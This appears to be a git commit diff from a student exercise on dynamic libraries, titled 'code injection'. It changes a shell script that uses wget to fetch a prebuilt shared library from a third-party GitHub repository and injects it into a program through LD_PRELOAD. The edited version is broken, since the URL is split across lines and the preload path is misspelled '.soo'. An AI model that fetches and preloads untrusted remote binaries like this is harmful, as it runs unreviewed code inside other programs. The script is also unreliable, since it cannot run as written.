a1814c04f62e80ee707d7568523402644a073311
Binawei <gbamilabina@gmail.com>
2022-12-13 10:12:08 -0800

    code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,5 @@
-#!/usr/bin
-wget -p /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
-export LD_PRELOAD=/tmp/putshack.so
+#!/bin/bash
+wget -P /tmp https://github.com/sidneyriffic/holbertonschool-lo
+w_level_programming/raw/master/0x17-dynamic_libraries/putshack.
+so
+export LD_PRELOAD=/tmp/putshack.soo
